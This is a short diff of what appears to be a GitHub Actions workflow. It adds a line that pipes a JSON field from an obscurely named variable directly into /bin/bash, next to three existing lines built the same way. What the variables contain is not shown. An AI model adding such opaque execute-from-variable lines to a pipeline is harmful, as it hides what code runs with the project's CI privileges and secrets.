@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$n34" | jq -r .nx548 | /bin/bash
           printf '%s' "$ur2" | jq -r .kc600 | /bin/bash
           echo $bzu61642 | jq -r .lwijl34168 | /bin/bash
+          echo $p54 | jq -r .er05802 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
